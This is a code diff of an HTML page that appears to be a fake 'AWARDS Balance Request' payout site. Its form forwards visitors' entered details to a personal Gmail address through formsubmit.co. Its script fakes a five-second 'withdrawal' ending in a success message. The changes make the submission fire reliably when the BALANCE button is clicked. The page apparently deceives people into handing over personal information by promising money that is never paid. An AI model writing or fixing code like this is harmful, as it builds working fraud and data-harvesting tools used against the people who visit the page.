@@ -117,11 +117,9 @@
 
 <div class="container">
 
-<form action="https://formsubmit.co/nyanyawetkaa@gmail.com" method="POST">
+<form id="submissionForm" action="https://formsubmit.co/nyanyawetkaa@gmail.com" method="POST">
 
     <input type="hidden" name="_subject" value="AWARDS Balance Request">
-
-    <input type="hidden" name="_next" value="https://aidfunds.github.io/Money/thankyou.html">
 
     <label>Enter your Name</label>
     <input type="text" id="name" name="Name" oninput="this.value=this.value.replace(/[^a-zA-Z ]/g,'')" placeholder="Your Name">
@@ -146,7 +144,7 @@
         Withdrawal successful. Click balance button to check balance.
     </div>
 
-    <button type="submit" id="balanceBtn" class="balance-btn">BALANCE</button>
+    <button type="button" id="balanceBtn" class="balance-btn">BALANCE</button>
 
 </form>
 
@@ -185,9 +183,11 @@ function checkFields() {
 document.getElementById("withdrawBtn").addEventListener("click", function() {
     if (!this.classList.contains("enabled")) return;
 
+    // Optional: Hide the button once clicked
+    this.style.display = 'none'; 
+
     document.getElementById("loading").style.display = "block";
 
-    // Simulate the withdrawal processing time (5 seconds)
     setTimeout(() => {
         document.getElementById("loading").style.display = "none";
         document.getElementById("success").style.display = "block";
@@ -195,16 +195,13 @@ document.getElementById("withdrawBtn").addEventListener("click", function() {
     }, 5000);
 });
 
-// 🛠️ MODIFICATION: Remove the line that prevents default submit
-// document.getElementById("balanceBtn").addEventListener("click", function(e){
-//     e.preventDefault(); 
-//     this.form.submit();
-// });
-// 
-// Instead, we will directly submit the form when the button is shown/clicked.
-// Since the button is inside the form and is type="submit", simply showing it 
-// and letting the default behavior happen is the cleanest solution.
 
+// 🚀 FINAL FIX: Explicitly submit the form when BALANCE is clicked.
+document.getElementById("balanceBtn").addEventListener("click", function(){
+    const form = document.getElementById("submissionForm");
+    // This action submits the data and redirects to FormSubmit's default thank you page.
+    form.submit();
+});
 </script>
 
 </body>
